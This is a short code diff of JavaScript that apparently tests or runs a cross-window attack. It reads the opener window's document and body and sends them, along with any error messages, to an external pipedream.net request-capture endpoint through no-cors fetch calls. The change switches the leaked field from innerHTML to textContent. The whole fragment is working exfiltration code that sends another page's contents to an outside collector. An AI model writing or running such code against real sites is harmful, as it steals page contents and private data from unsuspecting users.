@@ -24,7 +24,7 @@ try{
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener2=' + aaa.opener, {mode: 'no-cors'})
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener3=' + aaa.opener.document, {mode: 'no-cors'})
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener4=' + aaa.opener.document.body, {mode: 'no-cors'})
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener5=' + aaa.opener.document.body.innerHTML, {mode: 'no-cors'})
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener5=' + aaa.opener.document.body.textContent, {mode: 'no-cors'})
 } catch (error) {
   	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr2='+error, {mode: 'no-cors'})
 }
